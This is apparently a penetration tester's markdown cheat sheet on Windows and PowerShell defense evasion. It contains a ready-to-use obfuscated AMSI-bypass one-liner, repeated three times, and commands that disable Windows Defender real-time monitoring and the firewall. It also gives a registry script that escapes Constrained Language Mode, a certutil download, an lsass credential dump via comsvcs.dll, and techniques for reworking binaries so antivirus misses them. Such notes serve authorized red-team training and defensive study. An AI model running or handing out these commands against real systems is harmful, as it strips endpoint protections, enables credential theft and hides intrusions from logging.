# Evasion
- Not powershell but storing here. UAC bypasses https://github.com/hfiref0x/UACME

#### Powershell detections
- System-wide transcription
- Script Block logging 
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

## AMSI
- https://github.com/aloksaurabh/OffenPowerSh/blob/master/Bypass/Invoke-AlokS-AvBypass.ps1
- https://amsi.fail/
- Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

## Execution-policy
#### Get Execution policy
```
Get-Executionpolicy
```

#### Bypass execution policy
- Not meant to be a security measure
```
powershell –executionpolicy bypass .\script.ps1
powershell –c <cmd>
powershell –enc
powershell.exe -executionpolicy bypass
```

## Defense evasion
#### Check if windows defender is running
```
Get-MpComputerStatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPReference -DisableIOAVProtection $true

powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
```

#### Disable Firewall
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 

powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
```

## Constrained Lanuage Mode
#### Check the language mode
```
$ExecutionContext.SessionState.LanguageMode
```

### Escapes for Constrained Language Mode
#### Launch Powershell Version 2
```
Powershell.exe -Version 2
```

#### Overwrite __PSLockdownPolicy variable
- If CLM is not implemented correctly.
- https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1
```
#Requires -RunAsAdministrator

If ( $ExecutionContext.SessionState.LanguageMode -eq "ConstrainedLanguage") {
    Set-ItemProperty 'hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -name "__PSLockdownPolicy" -Value 8

    Start-Process -File PowerShell.exe -Argument "-file $($myinvocation.mycommand.definition)"
    Break
}

Write-Host $ExecutionContext.SessionState.LanguageMode

Start-Sleep -s 10
```

#### Download files with certutil
```
certutil -urlcache -split -f <URL>
```

#### Execute scripts
- It is possible to execute scripts on the filesystem but you can't load them!
- If applocker is there enumerate it to find a directory that lets you execute scripts in

## Applocker
#### Check if applocker policy is running
```
Get-AppLockerPolicy -Effective
```

#### Enumerate applocker policy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

#### Check applocker policy in registery
```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

#### Check for WDAC
```
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

#### If code integrity is enforced and PowerShell is running in Constrained Langauge Mode use winrs instead of psremoting
```
runas /netonly /user:<DOMAIN\<USER> cmd.exe
winrs -r:<PC NAME> cmd
```

#### Check for the policy
- ```.p7b``` is a signed policy
- Check if there are any ```.xml``` files which didn't got removed with the policy
```
ls C:\Windows\system32\CodeIntegrity
```

### LOLBAS
- Use Microsoft Signed Binaries to exploit https://lolbas-project.github.io/

#### For example dumping lsass:
```
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
dir C:\Users\Public\lsass.dmp
```

## AMSI Bypass
- https://amsi.fail/
- Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```
Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} $sess
```

## Invisi-shell
- Bypasses Sytem-Wide transcript
- https://github.com/OmerYa/Invisi-Shell
- Type exit from the new PowerShell session to complete the clean-up.

#### With admin privileges
```
./RunWithPathAsAdmin.bat 
```

#### With non-admin privileges:
```
RunWithRegistryNonAdmin.bat
```

## Winrs
- Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
```
winrs -remote:server1 -u:<COMPUTERNAME>\<USER> -p:<PASS> hostname
```

## Com objects
- https://github.com/bohops/WSMan-WinRM

## AV Bypass
- Can also use https://github.com/rasta-mouse/ThreatCheck
### Method one
- Defendercheck to check for signatures https://github.com/matterpreter/DefenderCheck
- Run Defendercheck ```DefenderCheck.exe <PATH TO BINARY>```
- Replace string which gets detected.
- Recompile and check again!

#### Method two
- Obfuscate binary with https://github.com/mkaring/ConfuserEx
- Launch ConfuserEx
- In Project tab select the Base Directory where the binary file is located.
- In Project tab Select the Binary File that we want to obfuscate.
- In Settings tab add the rules.
- In Settings tab edit the rule and select the preset as `Normal`.
- In Protect tab click on the protect button.
- We will find the new obfuscated binary in the Confused folder under the Base Directory.

#### If script gets detected use:
- https://github.com/yoda66/PowerStrip

#### Compile defendercheck
- Using visual studio code
```
csc.exe /target:exe /out:C:\tools\defendercheck.exe C:\Tools\DefenderCheck\DefenderCheck\DefenderCheck\Program.cs
```

#### Random notes
```
pyinstaller.exe --onefile .\CVE-2021-1675.py
pyarmor pack --clean -e "--onefile " .\CVE-2021-1675.py
```
